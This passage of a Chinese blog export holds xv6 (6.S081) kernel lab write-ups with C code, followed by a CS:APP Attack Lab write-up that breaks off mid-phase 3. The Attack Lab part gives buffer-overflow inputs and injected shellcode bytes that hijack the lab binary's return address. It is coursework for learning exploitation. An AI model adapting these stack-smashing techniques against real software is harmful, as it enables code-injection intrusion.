&lt;&lt; 8) 在kernel/vm.c中加入： 123456789101112131415161718192021222324252627282930intuvmcopy(pagetable_t old, pagetable_t new, uint64 sz){ pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i &lt; sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(&quot;uvmcopy: pte should exist&quot;); if((*pte &amp; PTE_V) == 0) panic(&quot;uvmcopy: page not present&quot;); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); // only for writable page if (flags &amp; PTE_W) { flags = (flags | PTE_COW) &amp; (~PTE_W); *pte = PA2PTE(pa) | flags; } increase_rc(pa); if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1;} 注意mappages失败时，删掉原有的kfree(mem)，因为我们没有申请新的内存。 发生page falut时，在usertrap()中捕获，对cow page分配真正的物理内存。 kernel/kalloc.c 123456789101112131415161718192021222324252627282930313233343536intcow_alloc(pagetable_t pagetable, uint64 va) { uint64 pa; uint64 mem; pte_t *pte; if (va &gt;= MAXVA) return -1; va = PGROUNDDOWN(va); pte = walk(pagetable, va, 0); if (pte == 0) { return -1; } // not a valid cow page if (!(*pte &amp; PTE_V)) { return -2; } pa = PTE2PA(*pte); // only one rf, make it writable acquire(&amp;kmem.lock); if (kmem.rc[pa / PGSIZE] == 1) { *pte &amp;= ~PTE_COW; *pte |= PTE_W; release(&amp;kmem.lock); return 0; } release(&amp;kmem.lock); if ((mem = (uint64)kalloc()) == 0){ return -3; } memmove((void *)mem, (void *)pa, PGSIZE); *pte = ((PA2PTE(mem) | PTE_FLAGS(*pte) | PTE_W) &amp; (~PTE_COW)); // decrease rc kfree((void *)pa); return 0;} 在我的实现中，当cow page发生page fault，且reference count为 1 时，不再重新分配页面进行复制，而是直接将该页面消去PTE_COW并加上PTE_W，减少内存分配和复制操作。 在kernel/trap.c： 12345678910111213else if(r_scause() == 13 || r_scause() == 15) { va = r_stval(); if (va &lt; PGROUNDDOWN(p-&gt;trapframe-&gt;sp) &amp;&amp; va &gt;= PGROUNDDOWN(p-&gt;trapframe-&gt;sp) - PGSIZE) { // guard page p-&gt;killed = 1; } else { int ret; if((ret = cow_alloc(p-&gt;pagetable, va)) &lt; 0 ) { p-&gt;killed = 1; } }} 当使用kalloc()进行内存分配时，需要将对应page的reference count设置为 1，使用kfree()释放内存时，只能将reference count为 0 的页面放回空闲列表。 kernel/kalloc.c： 123456789101112131415161718192021222324252627282930313233343536void *kalloc(void){ struct run *r; acquire(&amp;kmem.lock); r = kmem.freelist; if(r) { kmem.freelist = r-&gt;next; kmem.rc[(uint64)r / PGSIZE] = 1; } release(&amp;kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r;}voidkfree(void *pa){ struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP) panic(&quot;kfree&quot;); acquire(&amp;kmem.lock); kmem.rc[(uint64)pa / PGSIZE]--; if(kmem.rc[(uint64)pa / PGSIZE] &lt;= 0) { memset(pa, 1, PGSIZE); r = (struct run*)pa; r-&gt;next = kmem.freelist; kmem.freelist = r; } release(&amp;kmem.lock);} _注意_：kfree()中，对于kmem.rc[(uint64)pa / PGSIZE]的修改和读取必须是一个原子操作，否则内存可能被重复释放，例如对于某个物理page，同时 map 到 A、B 的页表中，之后： A : ref - 1 B : ref - 1 A : ref == 0 =&gt; free B : ref == 0 =&gt; free 最后，我们需要修改copyout()，同lazy allocation一样，当因为系统调用切换到内核页表时，硬件无法再为写cow page产生page fault，所以我们需要手动处理： 12345678910111213141516171819202122intcopyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len){ uint64 n, va0, pa0; while(len &gt; 0){ va0 = PGROUNDDOWN(dstva); cow_alloc(pagetable, va0); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n &gt; len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0;} 至此便完成了 lab6 copy on write。 最终代码见GitHub 仓库。","link":"/2021/02/27/6-S081-lab6-cow/"},{"title":"6.S081 lab7 thread","text":"本实验室将让你熟悉多线程。您将在用户级线程包中实现线程切换；使用多线程来加快程序的速度；并实现一个barrier。 Uthread: switching between threads实验代码中为我们提供了一个用户级别线程库，需要我们实现线程切换部分。我们需要给user/uthread.c中的thread_create()和thread_schedule()，以及user/uthread_switch.S中的thread_switch添加代码。 首先，我们为thread添加context以保存callee寄存器值，从kernel/proc.h中复制即可。 123456789101112131415161718192021222324struct context { uint64 ra; uint64 sp; // callee-saved uint64 s0; uint64 s1; uint64 s2; uint64 s3; uint64 s4; uint64 s5; uint64 s6; uint64 s7; uint64 s8; uint64 s9; uint64 s10; uint64 s11;};struct thread { char stack[STACK_SIZE]; /* the thread's stack */ int state; /* FREE, RUNNING, RUNNABLE */ struct context context;}; 然后是``thread_create()`： 123456789101112131415voidthread_create(void (*func)()){ struct thread *t; for (t = all_thread; t &lt; all_thread + MAX_THREAD; t++) { if (t-&gt;state == FREE) break; } t-&gt;state = RUNNABLE; // YOUR CODE HERE // user ra return func in switch t-&gt;context.ra = (uint64)func; // point to stack top(highest addr) t-&gt;context.sp = (uint64)t-&gt;stack + STACK_SIZE;} 利用ra在 switch 到 thread 后，返回到函数的位置，将sp指向该thread的栈顶。 最后是thread_schedule： 12345678910if (current_thread != next_thread) { /* switch threads? */ next_thread-&gt;state = RUNNING; t = current_thread; current_thread = next_thread; /* YOUR CODE HERE * Invoke thread_switch to switch from t to next_thread: * thread_switch(??, ??); */ thread_switch((uint64)&amp;t-&gt;context, (uint64)&amp;current_thread-&gt;context);} 至于thread_switch的代码，直接从kernel/switch.S中复制即可。 Using threads后面的两关都和xv6无关了，大概是有一些多线程的 feature，xv6无法提供，所以需要我们使用pthread。 实验为我们提供了一个无锁的hashtable，单线程下执行无误，但是多线程执行时，会发生如下问题： 12345❯ ./ph 2100000 puts, 1.780 seconds, 56190 puts/second0: 16577 keys missing1: 16577 keys missing200000 gets, 4.343 seconds, 46055 gets/second 这是因为，当两个线程同时插入hashtable的一个bucket时，会导致 key 丢失。 我们对put操作加锁即可（不要忘了在main()函数中初始化locks）： 12345678910111213141516171819202122pthread_mutex_t locks[NBUCKET];staticvoid put(int key, int value){ int i = key % NBUCKET; pthread_mutex_lock(&amp;locks[i]); // is the key already present? struct entry *e = 0; for (e = table[i]; e != 0; e = e-&gt;next) { if (e-&gt;key == key) break; } if(e){ // update the existing key. e-&gt;value = value; } else { // the new is new. insert(key, value, &amp;table[i], table[i]); } pthread_mutex_unlock(&amp;locks[i]);} Barrier本关要求我们实现一个barrie：在某个点上，所有相关的的线程必须等待，直到所有其他相关的线程也到达这个点。这个我们参考xv6中的sleep和wait的使用即可： 1234567891011121314151617181920static voidbarrier(){ // YOUR CODE HERE // // Block until all threads have called barrier() and // then increment bstate.round. // pthread_mutex_lock(&amp;bstate.barrier_mutex); bstate.nthread++; if (bstate.nthread == nthread) { bstate.round++; bstate.nthread = 0; pthread_cond_broadcast(&amp;bstate.barrier_cond); } else { pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex); } pthread_mutex_unlock(&amp;bstate.barrier_mutex);} 最终代码见GitHub 仓库。","link":"/2021/02/28/6-S081-lab7-thread/"},{"title":"6.S081 lab8 lock","text":"在本实验室中，将重新设计代码以提高并行性。在多核机器上，并行性差的一个常见症状是高强度的锁竞争。提高并行性通常需要改变数据结构和加锁策略，以减少争用。您将对 xv6 内存分配器和文件块缓存进行改进。 Memory allocatorxv6的内存分配与释放使用了一个全局锁kmem.lock，所有 cpu 想要分配和释放内存时，调用kfree()和kalloc()将对kmem.lock加锁，所以多线程同时获取和释放内存时，将造成激烈的锁竞争。本次实验将为每一个 cpu 实现单独的空闲内存链表，当一个 cpu 没有可用内存时，从另一个 cpu“窃取”。 在改进之前，进行kalloctest： 12345678910111213141516171819$ kallocteststart test1test1 results:--- lock kmem/bcache statslock: kmem: #fetch-and-add 134228 #acquire() 433016lock: bcache: #fetch-and-add 0 #acquire() 1242--- top 5 contended locks:lock: kmem: #fetch-and-add 134228 #acquire() 433016lock: proc: #fetch-and-add 39362 #acquire() 135295lock: virtio_disk: #fetch-and-add 8435 #acquire() 114lock: proc: #fetch-and-add 4895 #acquire() 135334lock: proc: #fetch-and-add 3939 #acquire() 135337tot= 134228test1 FAILstart test2total free number of pages: 32499 (out of 32768).....test2 OK 可以看到kmem锁的“#fetch-and-add”数值（即自旋次数）非常高，锁竞争非常吉利。 需要注意： The function cpuid returns the current core number, but it’s only safe to call it and use its result when interrupts are turned off. You should use push_off() and pop_off() to turn interrupts off and on. 修改kmem，kinit()，kfree，kalloc： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273struct { struct spinlock lock; struct run *freelist;} kmems[NCPU];char kbuf[NCPU][20];voidkinit(){ for (int i = 0; i &lt; NCPU; i++) { snprintf(kbuf[i], 20, &quot;kmem%d&quot;, i); initlock(&amp;kmems[i].lock, (char*)kbuf[i]); } freerange(end, (void*)PHYSTOP);}voidkfree(void *pa){ struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa &gt;= PHYSTOP) panic(&quot;kfree&quot;); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; // interrupt off push_off(); int cpu = cpuid(); acquire(&amp;kmems[cpu].lock); r-&gt;next = kmems[cpu].freelist; kmems[cpu].freelist = r; release(&amp;kmems[cpu].lock); // interrupt on pop_off();}void *kalloc(void){ struct run *r; push_off(); int cpu = cpuid(); acquire(&amp;kmems[cpu].lock); r = kmems[cpu].freelist; if(r) kmems[cpu].freelist = r-&gt;next; release(&amp;kmems[cpu].lock); // steal from other cpu if(!r) { for(int i = 0; i &lt; NCPU; i++) { if (i == cpu) continue; acquire(&amp;kmems[i].lock); r = kmems[i].freelist; if (r) { kmems[i].freelist = r-&gt;next; release(&amp;kmems[i].lock); break; } release(&amp;kmems[i].lock); } } pop_off(); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r;} 修改后进行kalloctest： 123456789101112131415161718192021$ kallocteststart test1test1 results:--- lock kmem/bcache statslock: kmem0: #fetch-and-add 0 #acquire() 65683lock: kmem1: #fetch-and-add 0 #acquire() 190628lock: kmem2: #fetch-and-add 0 #acquire() 176734lock: bcache: #fetch-and-add 0 #acquire() 1242--- top 5 contended locks:lock: proc: #fetch-and-add 35310 #acquire() 112156lock: virtio_disk: #fetch-and-add 11562 #acquire() 114lock: proc: #fetch-and-add 4717 #acquire() 112193lock: proc: #fetch-and-add 4242 #acquire() 112196lock: proc: #fetch-and-add 4058 #acquire() 112181tot= 0test1 OKstart test2total free number of pages: 32499 (out of 32768).....test2 OK 可以看到kmem锁竞争消失了。 Buffer cache在xv6中，使用buffer cache缓存一个磁盘block的内容，bcache使用一个锁来维护，每次bget和brelse都需要获取锁，这样将带来很激烈的锁竞争。 在修改前，bcachetest测试结果如下： 123456789101112131415$ bcacheteststart test0test0 results:--- lock kmem/bcache statslock: bcache: #fetch-and-add 90245 #acquire() 65022--- top 5 contended locks:lock: virtio_disk: #fetch-and-add 157311 #acquire() 1137lock: bcache: #fetch-and-add 90245 #acquire() 65022lock: proc: #fetch-and-add 82586 #acquire() 73871lock: proc: #fetch-and-add 59647 #acquire() 73519lock: proc: #fetch-and-add 29617 #acquire() 73520tot= 90245test0: FAILstart test1test1 OK 根据实验指导，我们将bcache的数据结构由一个双向链表改为hashtable，bucket数量使用素数来减少 hash 碰撞，其中steal_lock是整个bcache的大锁。 12345678910111213#define NBUCKET 13struct { struct buf head[NBUCKET]; struct spinlock lock[NBUCKET]; struct buf buf[NBUF]; struct spinlock steal_lock;} bcache;uintihash(uint blockno) { return blockno % NBUCKET;} 修改初始化代码，将每个bucket指向的buf构造成双向循环链表，方便查找头尾，每次被释放的buf将被移到头部，以实现 LRU，减少查找长度。 123456789101112131415161718192021222324252627282930char buf[NBUCKET][20];voidbinit(void){ struct buf *b; for (int i = 0; i &lt; NBUCKET; i++) { snprintf(buf[i], 20, &quot;bcache.bucket%d&quot;, i); initlock(&amp;bcache.lock[i], (char*)buf[i]); } initlock(&amp;bcache.steal_lock, &quot;bcache&quot;); for (int i = 0; i &lt; NBUCKET; i++) { // create a circular linked list // head.next is the first elem // head.prev is the last(LRU) elem struct buf *head = &amp;bcache.head[i]; head-&gt;prev = head; head-&gt;next = head; } int i; // Average distribut buf to each bucket for (b = bcache.buf, i = 0; b &lt; bcache.buf + NBUF; b++, i = (i + 1) % NBUCKET) { b-&gt;next = bcache.head[i].next; b-&gt;prev = &amp;bcache.head[i]; bcache.head[i].next-&gt;prev = b; bcache.head[i].next = b; initsleeplock(&amp;b-&gt;lock, &quot;buffer&quot;); }} 修改最关键的bget： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192static struct buf*bget(uint dev, uint blockno){ struct buf *b; uint idx = ihash(blockno); acquire(&amp;bcache.lock[idx]); for (b = bcache.head[idx].next; b != &amp;bcache.head[idx]; b = b-&gt;next) { if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) { b-&gt;refcnt++; release(&amp;bcache.lock[idx]); acquiresleep(&amp;b-&gt;lock); return b; } } // Not cached, find LRU for (b = bcache.head[idx].prev; b != &amp;bcache.head[idx]; b = b-&gt;prev) { if (b-&gt;refcnt == 0) { b-&gt;dev = dev; b-&gt;blockno = blockno; b-&gt;valid = 0; b-&gt;refcnt = 1; release(&amp;bcache.lock[idx]); acquiresleep(&amp;b-&gt;lock); return b; } } release(&amp;bcache.lock[idx]); acquire(&amp;bcache.steal_lock); acquire(&amp;bcache.lock[idx]); for (b = bcache.head[idx].next; b != &amp;bcache.head[idx]; b = b-&gt;next) { if(b-&gt;dev == dev &amp;&amp; b-&gt;blockno == blockno) { b-&gt;refcnt++; release(&amp;bcache.lock[idx]); release(&amp;bcache.steal_lock); acquiresleep(&amp;b-&gt;lock); return b; } } // Not cached, find LRU for (b = bcache.head[idx].prev; b != &amp;bcache.head[idx]; b = b-&gt;prev) { if (b-&gt;refcnt == 0) { b-&gt;dev = dev; b-&gt;blockno = blockno; b-&gt;valid = 0; b-&gt;refcnt = 1; release(&amp;bcache.lock[idx]); release(&amp;bcache.steal_lock); acquiresleep(&amp;b-&gt;lock); return b; } } // steal from other bucket uint _idx = idx; idx = ihash(idx + 1); while (idx != _idx) { acquire(&amp;bcache.lock[idx]); // Not cached; recycle an unused buffer. for (b = bcache.head[idx].prev; b != &amp;bcache.head[idx]; b = b-&gt;prev) { if (b-&gt;refcnt == 0) { b-&gt;dev = dev; b-&gt;blockno = blockno; b-&gt;valid = 0; b-&gt;refcnt = 1; b-&gt;prev-&gt;next = b-&gt;next; b-&gt;next-&gt;prev = b-&gt;prev; release(&amp;bcache.lock[idx]); b-&gt;next = bcache.head[_idx].next; b-&gt;prev = &amp;bcache.head[_idx]; b-&gt;next-&gt;prev = b; b-&gt;prev-&gt;next = b; release(&amp;bcache.lock[_idx]); release(&amp;bcache.steal_lock); acquiresleep(&amp;b-&gt;lock); return b; } } release(&amp;bcache.lock[idx]); idx = ihash(idx + 1); } release(&amp;bcache.lock[_idx]); release(&amp;bcache.steal_lock); panic(&quot;bget: no buffers&quot;);} 上面的代码中，在当前bucket中两次查看block是否已经被缓存或者有空闲buf可用，第二次使用了整个bcache的大锁。在我最开始的设计中，当前bucket中找不到可用buf时，直接尝试从其他bucket steal，这会导致潜在的死锁问题，当出现 A steal from B，B steal from A 的情况，就会死锁，这种情况代表了所有buf被消耗殆尽，这时应该执行到末尾的panic，而不能死锁在这里。 测试中应该没有同时消耗掉所有buf，所以死锁并不会出现，但还是应该在设计上避免死锁，所以使用了整个bcache的大锁steal_lock。当任何进程想要从其他bucket steal buf时，需要持有该锁，并且需要重复之前的扫描操作，防止执行空隙中有其他进程缓存了对应block，破坏操作的原子性，导致一个block被缓存两次。steal_lock仅影响 steal，当steal_lock被持有，不参与 steal 的其他bucket仍可以被并发地bget()。该设计需要感谢知乎iced coffe。 之后修改剩余的相关函数： 123456789101112131415161718192021222324252627282930313233343536373839voidbrelse(struct buf *b){ if(!holdingsleep(&amp;b-&gt;lock)) panic(&quot;brelse&quot;); releasesleep(&amp;b-&gt;lock); uint idx = ihash(b-&gt;blockno); acquire(&amp;bcache.lock[idx]); b-&gt;refcnt--; if (b-&gt;refcnt == 0) { // move to head b-&gt;next-&gt;prev = b-&gt;prev; b-&gt;prev-&gt;next = b-&gt;next; b-&gt;next = bcache.head[idx].next; b-&gt;prev = &amp;bcache.head[idx]; bcache.head[idx].next-&gt;prev = b; bcache.head[idx].next = b; } release(&amp;bcache.lock[idx]);}voidbpin(struct buf *b) { uint idx = ihash(b-&gt;blockno); acquire(&amp;bcache.lock[idx]); b-&gt;refcnt++; release(&amp;bcache.lock[idx]);}voidbunpin(struct buf *b) { uint idx = ihash(b-&gt;blockno); acquire(&amp;bcache.lock[idx]); b-&gt;refcnt--; release(&amp;bcache.lock[idx]);} 完成改进后，再进行bcachetest测试： 1234567891011121314151617181920212223242526272829$ bcacheteststart test0test0 results:--- lock kmem/bcache statslock: bcache.bucket0: #fetch-and-add 0 #acquire() 6174lock: bcache.bucket1: #fetch-and-add 0 #acquire() 6176lock: bcache.bucket2: #fetch-and-add 0 #acquire() 6336lock: bcache.bucket3: #fetch-and-add 0 #acquire() 6328lock: bcache.bucket4: #fetch-and-add 0 #acquire() 4270lock: bcache.bucket5: #fetch-and-add 0 #acquire() 4264lock: bcache.bucket6: #fetch-and-add 0 #acquire() 2680lock: bcache.bucket7: #fetch-and-add 0 #acquire() 4672lock: bcache.bucket8: #fetch-and-add 0 #acquire() 4400lock: bcache.bucket9: #fetch-and-add 0 #acquire() 4121lock: bcache.bucket10: #fetch-and-add 0 #acquire() 4169lock: bcache.bucket11: #fetch-and-add 0 #acquire() 6178lock: bcache.bucket12: #fetch-and-add 0 #acquire() 6176lock: bcache: #fetch-and-add 0 #acquire() 7--- top 5 contended locks:lock: virtio_disk: #fetch-and-add 144778 #acquire() 1197lock: proc: #fetch-and-add 82509 #acquire() 73738lock: proc: #fetch-and-add 8076 #acquire() 73425lock: proc: #fetch-and-add 7466 #acquire() 73385lock: proc: #fetch-and-add 7014 #acquire() 73384tot= 0test0: OKstart test1test1 OK 可见bcache锁的竞争消失了。 最终代码见GitHub 仓库。","link":"/2021/03/01/6-S081-lab8-lock/"},{"title":"6.S081 lab9 fs","text":"Large files本关需要为xv6添加对大文件的支持。xv6的 inode 默认使用 12 个直接块指针和 1 个间接块指针（指向一个存储着块指针的数据块），所以xv6支持的最大文件尺寸是12 + 1*256=268个 block。我们需要将一个直接块指针修改为双重间接块指针（执行一个存储着间接块指针的数据块），将xv6的最大文件尺寸扩展到11 + 1*256 + 1*256*256= 65803个 block。 首先我们修改kernel/fs.h中的相关宏定义： 1234#define NDIRECT 11#define NINDIRECT (BSIZE / sizeof(uint))#define NDOUBLEINDIRECT ((BSIZE / sizeof(uint)) * (BSIZE / sizeof(uint)))#define MAXFILE (NDIRECT + NINDIRECT + NDOUBLEINDIRECT) 然后修改dinode和inode中的地址数组定义： 1uint addrs[NDIRECT+2]; 接下来修改bmap函数，该函数用于将一个文件的逻辑块号转换为设备的物理块号，类似于虚实地址转换： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354static uintbmap(struct inode *ip, uint bn){ uint addr, *a; struct buf *bp; if(bn &lt; NDIRECT){ if((addr = ip-&gt;addrs[bn]) == 0) ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev); return addr; } bn -= NDIRECT; if(bn &lt; NINDIRECT){ // Load indirect block, allocating if necessary. if((addr = ip-&gt;addrs[NDIRECT]) == 0) ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev); bp = bread(ip-&gt;dev, addr); a = (uint*)bp-&gt;data; if((addr = a[bn]) == 0){ a[bn] = addr = balloc(ip-&gt;dev); log_write(bp); } brelse(bp); return addr; } bn -= NINDIRECT; if(bn &lt; NDOUBLEINDIRECT){ // Load double-indirect block, allocating if necessary. if((addr = ip-&gt;addrs[NDIRECT+1]) == 0) ip-&gt;addrs[NDIRECT+1] = addr = balloc(ip-&gt;dev); bp = bread(ip-&gt;dev, addr); a = (uint*)bp-&gt;data; uint level1 = bn / NINDIRECT; if((addr = a[level1]) == 0){ a[level1] = addr = balloc(ip-&gt;dev); log_write(bp); } brelse(bp); bp = bread(ip-&gt;dev, addr); a = (uint*)bp-&gt;data; uint level2 = bn % NINDIRECT; if((addr = a[level2]) == 0){ a[level2] = addr = balloc(ip-&gt;dev); log_write(bp); } brelse(bp); return addr; } panic(&quot;bmap: out of range&quot;);} 然后修改itrunc函数，在 truncate 文件时，释放我们新添加的双重间接数据块（不要忘了释放指针块本身）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152voiditrunc(struct inode *ip){ int i, j, k; struct buf *bp, *nbp; uint *a, *na; for(i = 0; i &lt; NDIRECT; i++){ if(ip-&gt;addrs[i]){ bfree(ip-&gt;dev, ip-&gt;addrs[i]); ip-&gt;addrs[i] = 0; } } if(ip-&gt;addrs[NDIRECT]){ bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT]); a = (uint*)bp-&gt;data; for(j = 0; j &lt; NINDIRECT; j++){ if(a[j]) bfree(ip-&gt;dev, a[j]); } brelse(bp); bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT]); ip-&gt;addrs[NDIRECT] = 0; } if(ip-&gt;addrs[NDIRECT+1]){ bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT+1]); a = (uint*)bp-&gt;data; for(j = 0; j &lt; NINDIRECT; j++){ // level1 if(a[j]) { nbp = bread(ip-&gt;dev, a[j]); na = (uint*)nbp-&gt;data; for(k = 0; k &lt; NINDIRECT; k++) { // level2 if(na[k]) { bfree(ip-&gt;dev, na[k]); } } bfree(ip-&gt;dev, a[j]); brelse(nbp); } } brelse(bp); bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT+1]); ip-&gt;addrs[NDIRECT+1] = 0; } ip-&gt;size = 0; iupdate(ip);} 运行bigfile测试，看到测试创建了一个 size 为65803个 block 的最大文件。 1234$ bigfile..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................wrote 65803 blocksbigfile done; ok Symbolic links这次我们需要实现一个syscall，用于创建符号连接，符号链接不会增加实际文件inode的 link 数，只是使用路径指向被 link 的文件。 首先，按照之前熟悉的方法添加新的syscall。 在kernel/stat.h中添加符号文件类型： 1#define T_SYMLINK 4 在kernel/fcntl.h中添加： 1#define O_NOFOLLOW 0x800 用于标识是要读取符号文件本身还是符号链接指向的文件。 之后我们实现symlink本身： 1234567891011121314151617181920212223242526272829303132333435uint64sys_symlink(void) { char target[MAXPATH], path[MAXPATH];; struct inode *ip; if(argstr(0, target, MAXPATH) &lt; 0|| argstr(1, path, MAXPATH) &lt; 0) { return -1; } begin_op(); if ((ip = create(path, T_SYMLINK, 0, 0)) == 0){ end_op(); return -1; } int len = strlen(target); // write target path len if(writei(ip, 0, (uint64)&amp;len, 0, sizeof(len)) &lt; sizeof(len)) { iunlockput(ip); end_op(); return -1; } // write target path if(writei(ip, 0, (uint64)target, sizeof(len), len + 1) &lt; 0) { iunlockput(ip); end_op(); return -1; } iunlockput(ip); end_op(); return 0;} 首先我们为符号文件创建一个新的inode，然后向其数据区写入指向的目标。在写入目标时，使用了[len, target]的格式，方便我们之后能准确地从文件系统中读取出target。 然后，我们需要修改sys_open，使之正确的处理符号文件。 Modify the open system call to handle the case where the path refers to a symbolic link. If the file does not exist, open must fail. When a process specifies O_NOFOLLOW in the flags to open, open should open the symlink (and not follow the symbolic link). If the linked file is also a symbolic link, you must recursively follow it until a non-link file is reached. If the links form a cycle, you must return an error code. You may approximate this by returning an error code if the depth of links reaches some threshold (e.g., 10). 当没有设置O_NOFOLLOW时，open调用需要打开符号文件指向的真实文件，如果被符号文件指向的文件也是符号文件，则需要递归查找，指导找到真实文件。为了防止循环引用，当查找次数一定数值时，可以判断失败。 123456789101112131415161718192021222324252627282930313233#define MAXSYMLINK 10if (!(omode &amp; O_NOFOLLOW)) { int cnt = MAXSYMLINK; int len = 0; while (cnt-- &gt; 0) { ilock(ip); if (ip-&gt;type == T_SYMLINK) { if (readi(ip, 0, (uint64)&amp;len, 0, sizeof(len)) &lt; sizeof(len)) { iunlockput(ip); end_op(); return -1; } if (readi(ip, 0, (uint64)path, sizeof(len), len + 1) &lt; len + 1) { iunlockput(ip); end_op(); return -1; } iunlockput(ip); } else { iunlock(ip); break; } if((ip = namei(path)) == 0){ end_op(); return -1; } } if (cnt &lt;= 0) { end_op(); return -1; }} 完整代码见GitHub 仓库。","link":"/2021/03/02/6-S081-lab9-fs/"},{"title":"CS:APP Attack lab","text":"实验描述本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在 getbuf 函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。 第一阶段第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。 那么我们将需要执行的操作码和地址输入机器码即可。 phase_1第一关非常简单，题目主要我们在 getbuf 执行完成后执行 touch1,touch1()无参。 1234567891011121314151617181920(gdb) disas getbufDump of assembler code for function getbuf: 0x0000000000401688 &lt;+0&gt;: sub $0x18,%rsp 0x000000000040168c &lt;+4&gt;: mov %rsp,%rdi 0x000000000040168f &lt;+7&gt;: callq 0x4018ca &lt;Gets&gt; 0x0000000000401694 &lt;+12&gt;: mov $0x1,%eax 0x0000000000401699 &lt;+17&gt;: add $0x18,%rsp 0x000000000040169d &lt;+21&gt;: retqEnd of assembler dump.(gdb) disas touch1Dump of assembler code for function touch1: 0x00000000004016a0 &lt;+0&gt;: sub $0x8,%rsp 0x00000000004016a4 &lt;+4&gt;: movl $0x1,0x2029ee(%rip) # 0x60409c &lt;vlevel&gt; 0x00000000004016ae &lt;+14&gt;: mov $0x402e4e,%edi 0x00000000004016b3 &lt;+19&gt;: callq 0x400bd0 &lt;puts@plt&gt; 0x00000000004016b8 &lt;+24&gt;: mov $0x1,%edi 0x00000000004016bd &lt;+29&gt;: callq 0x401ab5 &lt;validate&gt; 0x00000000004016c2 &lt;+34&gt;: mov $0x0,%edi 0x00000000004016c7 &lt;+39&gt;: callq 0x400d60 &lt;exit@plt&gt;End of assembler dump. 可以看到，getbuf 开出了 0x18，即 24 字节的空间，touch1 的地址为 0x4016a0。那么我们只需填满这 0x28 空间，再以 touch1 地址替代返回值。注意：x86-64 机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。 123400 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00a0 16 40 00 00 00 00 00 转换后输入即可 12345678Cookie: 0x63149380Type string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00 phase_2第二关根据题意，需要调用 touch2，需要传递一个无符号整数值，其值为 cookie，查看 cookie 文件，如下。 122017211523@bupt3:~/target117$ cat cookie.txt0x63149380 为了给 touch2 传参，我们需要将 cookie 值赋给%rdi，然后将 touch2 地址压栈，使用 ret 弹出 touch2 地址返回，调用 touch2。 123mov $0x63149380,%rdipushq $0x4016ccret 将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。 123456789phase2.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;.text&gt;: 0: 48 c7 c7 80 93 14 63 mov $0x63149380,%rdi 7: 68 cc 16 40 00 pushq $0x4016cc c: c3 retq 我们将指令的机器码放在 getbuf 时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用 getbuf 时栈顶地址为 0x5566f7a8。 123448 c7 c7 80 93 14 63 68cc 16 40 00 c3 00 00 0000 00 00 00 00 00 00 00a8 f7 66 55 00 00 00 00 输入运行。 1234567892017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -qCookie: 0x63149380Type string:Touch2!: You called touch2(0x63149380)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 phase_3查看 touch3 123456789101112void touch3(char *sval){ vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(&quot;Touch3!: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); validate(3);} else { printf(&quot;Misfire: You called touch3(\\&quot;%s\\&quot;)\\n&quot;, sval); fail(3);} exit(0);} 可知其需要一个指向字符的指针 sval，然后调用 hexmatch，将 cookie 和 sval 作为参数传入，需要 hexomatch 返回非零值。 12345678int hexmatch(unsigned val, char *sval){ char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, &quot;%.8x&quot;, val); return strncmp(sval, s, 9) == 0;} 由 hexmatch 可知，其比较 cookie 的字符串表示与传入的字符串是否相等，相等则返回 1，那么问题明了，我们需要将表示 cookie 的字符串地址传给 touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用 hexmatch 时候未被重写改变的空间，借以保存字符串。 123mov $0x5566f7c8,%rdipushq $0x4017a0ret 这里我们将 cookie 